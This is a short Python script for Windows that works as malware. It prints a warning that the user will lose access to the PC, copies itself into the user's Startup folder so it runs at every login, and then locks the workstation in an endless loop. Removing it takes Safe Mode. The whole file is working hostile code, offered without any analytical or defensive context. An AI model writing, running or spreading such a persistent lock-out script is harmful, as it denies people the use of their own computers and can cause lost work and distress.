import ctypes
import os
import shutil
import time
print("YOU WILL LOSE ACCESS TO YOUR PC UNLESS THIS SCRIPT IS MANUALLY REMOVED FROM 'shell:startup' IN SAFE MODE")
try:
   shutil.copy(__file__,os.path.expanduser("~")+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
except:
   print('Failed to move to startup apps. Running as 1 time.')
   print("10 seconds till running ")
   time.sleep(9)
try:
  while True:
    ctypes.windll.user32.LockWorkStation()
except PermissionError:
    print("Permission error. Run as admin")
